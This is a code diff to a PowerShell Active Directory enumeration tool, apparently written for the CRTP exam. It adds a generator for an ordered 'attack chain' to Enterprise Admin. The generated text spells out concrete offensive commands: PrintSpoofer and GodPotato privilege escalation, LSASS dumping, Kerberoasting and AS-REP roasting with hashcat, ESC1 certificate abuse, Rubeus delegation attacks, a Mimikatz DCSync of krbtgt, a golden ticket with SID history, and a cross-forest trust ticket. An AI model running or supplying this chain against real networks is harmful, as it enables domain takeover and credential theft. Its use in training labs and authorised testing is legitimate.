@@ -1120,6 +1120,7 @@ function Invoke-CRTPEnum {
     $s += "      INFO = background facts"
     $s += "  * For the EXACT command per finding -> open EXPLOIT_COMMANDS.txt"
     $s += "  * For the full start-to-finish walkthrough -> open CRTP-Playbook.txt"
+    $s += "  * For an ORDERED route to Enterprise Admin from THIS run -> open ATTACK_CHAIN.txt"
     $s += "  * Everything in one file -> _ALL.txt   |   what's new since last run -> NEW_this_run.txt"
     $s += "  * Counts this run:  HIGH=$($high.Count)  MED=$($med.Count)  INFO=$($inf.Count)"
     $s += ("=" * 76)
@@ -1501,6 +1502,110 @@ function Invoke-CRTPEnum {
     Save 'CRTP-Playbook.txt' $pb
     Log " Phase playbook       : $run\CRTP-Playbook.txt" 'Magenta'
 
+    # ---------------- ATTACK CHAIN (stitch this run's findings into an ordered route to EA) ----------------
+    Sect "Building attack chain to Enterprise Admin"
+    function _tgt($d){ @($d.User,$d.Host,$d.Template,$d.Principal,$d.Instance,$d.Account) | Where-Object { $_ } | Select-Object -First 1 }
+    function _pick($types){ foreach($t in $types){ $h = $expl | Where-Object { $_.Type -eq $t } | Select-Object -First 1; if($h){ return $h } }; return $null }
+    $amAdmin2 = $false
+    try { $amAdmin2 = (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator) } catch {}
+    $goal = if ($g_forest -and $g_forest -ne $Domain) { "Enterprise Admin on forest root '$g_forest'" }
+            elseif ($g_parent -and $g_parent -ne $Domain) { "Enterprise Admin via parent '$g_parent'" }
+            else { "Domain Admin on '$Domain'" }
+    $ch = @()
+    $ch += "============================================================================"
+    $ch += " ATTACK CHAIN   ->   GOAL: $goal"
+    $ch += " Auto-built from THIS run's findings. Do the steps in order; each step's"
+    $ch += " full command is in EXPLOIT_COMMANDS.txt / CRTP-Playbook.txt."
+    $ch += " A [GAP] step = no finding for it this run -> get that access, then re-run."
+    $ch += "============================================================================"
+    $sN = 0
+
+    # Step 1: local -> SYSTEM
+    $p = _pick @('Priv_SeImpersonatePrivilege','Priv_SeDebugPrivilege','Priv_SeBackupPrivilege')
+    $sN++
+    if ($p) {
+        $ch += "`n[$sN] LOCAL -> SYSTEM  on $env:COMPUTERNAME"
+        switch($p.Type){
+            'Priv_SeImpersonatePrivilege' { $ch += "     SeImpersonate:  PrintSpoofer.exe -i -c cmd.exe   (or GodPotato)" }
+            'Priv_SeDebugPrivilege'       { $ch += "     SeDebug: FindLSASSPID.exe ; minidumpdotnet.exe <pid> lsass.dmp -> creds" }
+            'Priv_SeBackupPrivilege'      { $ch += "     SeBackup: read SAM/SYSTEM hives -> secretsdump offline" }
+        }
+    } elseif ($amAdmin2) {
+        $ch += "`n[$sN] LOCAL: already elevated on $env:COMPUTERNAME (dump creds here if useful)."
+    } else {
+        $ch += "`n[$sN] [GAP] LOCAL: not admin here. Run PowerUp/SharpUp/winPEAS for a privesc, then continue."
+    }
+
+    # Step 2: get a domain credential
+    $p = _pick @('LAPS','GMSA','GPP','Kerberoast','ASREP')
+    $sN++
+    if ($p) {
+        $t = _tgt $p.Data
+        $ch += "`n[$sN] GET A DOMAIN CREDENTIAL  (via $($p.Type)$(if($t){" : $t"}))"
+        switch($p.Type){
+            'LAPS'       { $ch += "     use the readable LAPS local-admin password (06d_laps.txt) to log in." }
+            'GMSA'       { $ch += "     read gMSA managed password -> use its NTLM (Rubeus /rc4)." }
+            'GPP'        { $ch += "     decrypt the GPP cpassword (Get-GPPPassword / gpp-decrypt)." }
+            'Kerberoast' { $ch += "     Rubeus kerberoast /user:$t -> hashcat -m 13100 -> use the cracked password." }
+            'ASREP'      { $ch += "     Rubeus asreproast /user:$t -> hashcat -m 18200 -> use the cracked password." }
+        }
+    } else {
+        $ch += "`n[$sN] [GAP] GET A CREDENTIAL: none auto-found. Try password spray (06b), shares (-HostSweep), or desc secrets."
+    }
+
+    # Step 3: domain privilege escalation
+    $p = _pick @('ESC1','DumpTarget','ConstrainedHost','ConstrainedUser','RBCD','UnconstrainedHost')
+    $sN++
+    if ($p) {
+        $t = _tgt $p.Data
+        $ch += "`n[$sN] DOMAIN PRIVILEGE ESCALATION  (via $($p.Type)$(if($t){" : $t"}))"
+        switch($p.Type){
+            'ESC1'            { $ch += "     Certify request /template:$t /altname:administrator -> Rubeus asktgt /certificate -> DA-level." }
+            'DumpTarget'      { $ch += "     you're admin on $t where a privileged user is logged on -> dump LSASS -> steal their creds." }
+            'ConstrainedHost' { $ch += "     Rubeus s4u (host $t) /impersonateuser:administrator /ptt -> admin to that service." }
+            'ConstrainedUser' { $ch += "     Rubeus s4u (user $t) /impersonateuser:administrator /ptt." }
+            'RBCD'            { $ch += "     Rubeus s4u via a controlled acct /msdsspn:cifs/$t /ptt -> admin on $t." }
+            'UnconstrainedHost'{ $ch += "     on ${t}: Rubeus monitor + coerce a DC (MS-RPRN) -> capture the DC TGT." }
+        }
+    } else {
+        $ch += "`n[$sN] [GAP] DOMAIN PRIVESC: no direct primitive found. Abuse dangerous ACLs (07), DnsAdmins, or a cracked privileged service account."
+    }
+
+    # Step 4: Domain Admin / krbtgt
+    $p = _pick @('DCSync')
+    $sN++
+    if ($p) {
+        $ch += "`n[$sN] DOMAIN ADMIN: DCSync as $($p.Data.Principal) -> pull the krbtgt hash."
+    } else {
+        $ch += "`n[$sN] DOMAIN ADMIN: once the step above gives you DA, DCSync the krbtgt hash."
+    }
+    $ch += "     Invoke-Mimi -Command '`"lsadump::dcsync /user:$shortDom\krbtgt`"'"
+
+    # Step 5: child -> parent (Enterprise Admin) when a parent domain exists
+    if ($g_parent -and $g_parent -ne $Domain) {
+        $sid5 = if ($g_domainSID) { $g_domainSID } else { '<child-domain-SID>' }
+        $sN++
+        $ch += "`n[$sN] CHILD -> PARENT  (Enterprise Admin on $g_parent)"
+        $ch += "     forge a golden ticket with SID history (needs the child krbtgt hash from step $($sN-1)):"
+        $ch += "     Invoke-Mimi -Command '`"kerberos::golden /user:Administrator /domain:$Domain /sid:$sid5 /krbtgt:<child-krbtgt-hash> /sids:<parent-SID>-519 /ptt`"'"
+        $ch += "     (parent SID: Get-ADDomain -Server $g_parent | select DomainSID)  ->  verify: ls \\$($g_parent)-dc\c`$"
+    }
+
+    # Step 6: cross-forest when the forest root differs
+    if ($g_forest -and $g_forest -ne $Domain -and $g_forest -ne $g_parent) {
+        $sN++
+        $ch += "`n[$sN] CROSS-FOREST  ($g_forest)"
+        $ch += "     dump the inter-realm trust key (dcsync the trust account) and forge an inter-realm TGT:"
+        $ch += "     Rubeus.exe asktgs /service:cifs/<forest-dc> /ticket:trust.kirbi /ptt"
+        $ch += "     Note: SID filtering across a forest trust usually limits you to specific SPNs/resources."
+    }
+
+    $ch += "`n============================================================================"
+    $ch += " DONE when you have: $goal"
+    $ch += " Re-run this tool as each new identity to rebuild the chain from the new position."
+    Save 'ATTACK_CHAIN.txt' $ch
+    Log " Attack chain: $run\ATTACK_CHAIN.txt   (ordered route to EA)" 'Magenta'
+
     # ---------------- MASTER findings (dedup, accumulates across runs) ----------------
     try {
         $master = Join-Path $OutDir '_MASTER_findings.txt'
@@ -1593,6 +1698,9 @@ tr.hi{background:#2d1416}tr:hover{background:#161b22}
             '18_mssql_crawl'      = 'PowerUpSQL MSSQL link crawl (opt-in)'
             '19_bloodhound'       = 'SharpHound collection for BloodHound (opt-in)'
             '11_trusted_domains'  = 'Recon across trusted domains (-IncludeForest)'
+            'ATTACK_CHAIN'        = 'Ordered route to Enterprise Admin from this run'
+            'CRTP-Playbook'       = 'Phase 0-8 whole-exam walkthrough'
+            'EXPLOIT_COMMANDS'    = 'Exact command per finding'
         }
         $idx = @()
         $idx += "INDEX - $Domain - $(Get-Date)"
